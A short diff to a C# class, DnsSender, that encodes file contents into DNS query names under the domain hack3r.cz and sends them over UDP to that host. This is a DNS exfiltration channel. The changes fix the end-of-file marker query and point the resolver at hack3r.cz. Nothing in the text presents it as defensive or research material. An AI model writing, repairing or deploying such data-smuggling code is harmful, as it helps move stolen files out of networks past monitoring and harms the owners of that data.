@@ -34,7 +34,7 @@ public class DnsSender
                 string dns = part.Replace("=", "--R") + ".hack3r.cz";
                 SendDns(dns);
             }
-            SendDns("----END---- " + dnsfile + "¨------.hack3r.cz");
+            SendDns("----END---- " + dnsfile + "------.hack3r.cz");
             Log("File processed successfully.");
         }
         catch (Exception ex)
@@ -72,7 +72,7 @@ public class DnsSender
         try
         {
             Log("Sending DNS request: " + dnsRequest);
-            string dnsServer = "dns.hack3r.cz";
+            string dnsServer = "hack3r.cz";
             IPAddress[] addresses = Dns.GetHostAddresses(dnsServer);
             IPEndPoint dnsEndpoint = new IPEndPoint(addresses[0], 53);
             UdpClient dnsClient = new UdpClient();
